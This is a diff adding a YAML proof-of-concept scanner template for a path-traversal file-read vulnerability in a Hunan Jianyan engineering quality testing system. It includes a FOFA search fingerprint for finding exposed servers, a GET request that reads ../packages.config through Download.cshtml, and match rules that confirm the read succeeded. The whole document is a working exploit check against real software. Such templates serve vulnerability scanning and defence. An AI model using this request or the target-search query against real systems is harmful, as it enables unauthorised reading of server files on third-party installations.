@@ -1,0 +1,16 @@
+id: poc-yaml-hunanjianyan-detection-system-download-fileread
+info:
+  name: 湖南建研工程质量检测系统 /Applications/Bid/Download.cshtml 文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 湖南建研检测系统
+  fofa: body="/Content/Theme/Standard/"
+requests:
+- method: GET
+  path: /Applications/Bid/Download.cshtml?file=../packages.config
+  expression: "status_code == 200 && \ncontains(body,\"<?xml version\") &&\ncontains(body,\"\
+    <package id=\") &&\ncontains(body,\"</packages>\") &&\ncontains(headers,\"application/ms-excel\"\
+    )\n"
+variables: {}
+transport: http
